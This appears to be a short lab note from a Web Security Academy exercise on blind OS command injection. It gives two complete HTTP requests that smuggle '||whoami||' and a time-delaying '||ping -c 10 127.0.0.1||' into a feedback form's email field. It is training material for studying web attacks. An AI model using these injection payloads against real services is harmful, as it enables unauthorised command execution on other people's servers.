@@ -1,0 +1,37 @@
+Found blind Command Injection in the reqest:
+POST /feedback/submit HTTP/2
+Host: 0a3300340320485282c99d4d006a00a9.web-security-academy.net
+Cookie: session=V3sYTJTGkln93KdUoRKeBeb6tl63883W
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 99
+Origin: https://0a3300340320485282c99d4d006a00a9.web-security-academy.net
+Referer: https://0a3300340320485282c99d4d006a00a9.web-security-academy.net/feedback
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Te: trailers
+
+csrf=V6AFzQsskxPf8uRHTJxnTZcD2PCTNtGv&name=sdd&email=sddsa%40fd.net||whoami||&subject=d&message=ASD
+
+To check on the blind command injection via cauing late in response (ping):
+POST /feedback/submit HTTP/2
+Host: 0a3300340320485282c99d4d006a00a9.web-security-academy.net
+Cookie: session=V3sYTJTGkln93KdUoRKeBeb6tl63883W
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 113
+Origin: https://0a3300340320485282c99d4d006a00a9.web-security-academy.net
+Referer: https://0a3300340320485282c99d4d006a00a9.web-security-academy.net/feedback
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Te: trailers
+
+csrf=V6AFzQsskxPf8uRHTJxnTZcD2PCTNtGv&name=sdd&email=sddsa%40fd.net||ping+-c+10+127.0.0.1||&subject=d&message=ASD
